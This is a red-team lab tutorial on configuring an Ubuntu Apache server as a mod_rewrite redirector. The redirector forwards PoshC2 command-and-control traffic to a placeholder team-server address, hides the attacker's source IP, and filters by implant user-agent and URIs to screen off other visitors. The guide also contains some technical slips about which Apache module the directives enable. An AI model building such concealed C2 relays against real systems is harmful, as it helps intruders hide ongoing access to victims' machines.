# Setting up proxy 

When running actions as an actor you always want to avoid giving away where you are coming from or your source ip. Typically this is done with a proxy also sometimes known as a LP (listening post), in this case it will be an ubuntu server running apache. Your current setup is as follows: 

	parrot-OS <> Victim VM

What we will be doing with the Ubuntu server is routing our C2 traffic through it so it appears it as though it is coming from the Ubuntu server and the the Parrot vm.

	Parrot <> Ubuntu <> Victim VM 

Lets install any Ubuntu server ISO from the interwebs [here](https://ubuntu.com/download/server).

# Configureing Apache on Ubuntu

Setting up your Ubuntu server should be fairly similar to how you set up your Parrot VM considering they are both linux based devices. 

Once your IPs are set and your Ubuntu server can route two both your Parrot and your Victim machine, lets set up apache.

```bash 
service apache status 
```

Depending on your setup apache/apache2 might be inactive(dead) by default. To start it we will run the following

```bash 
sudo service apache/apache2 start
```

You can verify by running the same status command 

```bash 
service apache status 
```
> **NOTE:** If you ever have issues starting your apache server to read the error codes. You could run into issues depending on the services you might already have running if they are using ports or services needed for apache.
  
Now if you open a browser of your choice in your Ubuntu server or attack box and browse to your Ubuntus IP you should be met with an apache2 default page describing how to configure your new apache server, read up because I dont want to retype all that. 

Apache configuring tree: 

	/etc/apache2/
	|-- apache2.conf
	|       `--  ports.conf
	|-- mods-enabled
	|       |-- *.load
	|       `-- *.conf
	|-- conf-enabled
	|       `-- *.conf
	|-- sites-enabled
	|       `-- *.conf

Now if you want to be a kool kid like Duck and change your web page to idk say a picture of a duck, we have to navigate to our web root at /var/www/html and change the content inside of our index.html file. We also have to get our duck.jpg file and drop it in are web root. 

```html
<!DOCTYPE html>
<html>
<body>

<h1>Its a Duck</h1>
<img src="duck.jpg" alt="W3Schools.com" width="104" height="142">

</body>
</html>
```

# Configure Proxy 

Now lets move to configuring our proxy for our C2 coms.

First we will navigate to /etc/apache2/site-enabled and view our `000-default.conf`, this is where we configure our setting for our currently hosted sites. Inside will looking something like this:

```apache 
<VirtualHost *:80>
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/html

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

What we want to add is an apache module called `mod_proxy`, we can do that with 2 new lines. 

```apache
<VirtualHost *:80>
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/html

	AllowOverride All
   	RewriteEngine On

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```
Now that we have `mod_rewite` enabled we want to use the rewrite rules to create our filters. 

The first argument is a variable describing a characteristic of the request, the second argument is a regular expression that must match the variable, and a third optional argument is a list of flags that modify how the match is evaluated.

```html 
RewriteRule Pattern Substitution [flag]
```

Lets add our proxy rule to allow our C2 coms through our new proxy. 

```apache
<VirtualHost *:80>
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/html

	AllowOverride All
   	RewriteEngine On

	RewriteRule ^.*$ http://BADIPHERE%{REQUEST_URI} [P]

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```
With the above rules you should now have a proxy setup to push your C2 coms through the Ubuntu server. Keep in mind you now have to reconfigure your Poshc2 to have host coms be your Ubuntu server. You can get real fancy with mod_rewrite and add more rules/conditions to allow only C2 coms through and redirect anything else by filtering by your useragent string set in your poshc2 `config.yml` as well as your uri request for files being hosted, example code bellow as well as resources links on how to do fancy things below. 

```apache
RewriteEngine On
RewriteCond %{REQUEST_URI} ^/(metro91/admin/1/ppptp.jpg|metro91/admin/1/secure.php)/?$
RewriteCond %{HTTP_USER_AGENT} ^Mozilla/4\.0\ \(compatible;\ MSIE\ 6\.0;\ Windows\ NT\ 5\.1;\ SV1;\ InfoPath\.2\)?$
RewriteRule ^.*$ http://TEAMSERVER-IP%{REQUEST_URI} [P]
RewriteRule ^.*$ http://example.com/? [L,R=302]
```